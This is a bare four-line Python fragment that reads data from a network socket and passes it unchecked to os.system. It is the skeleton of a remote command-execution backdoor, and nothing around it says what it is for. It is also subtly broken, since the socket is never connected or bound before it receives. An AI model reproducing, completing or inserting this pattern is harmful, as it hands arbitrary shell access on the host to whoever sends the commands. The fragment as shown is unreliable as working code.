import socket, os
s = socket.socket()
command = s.recv(1024).decode()
os.system(command)
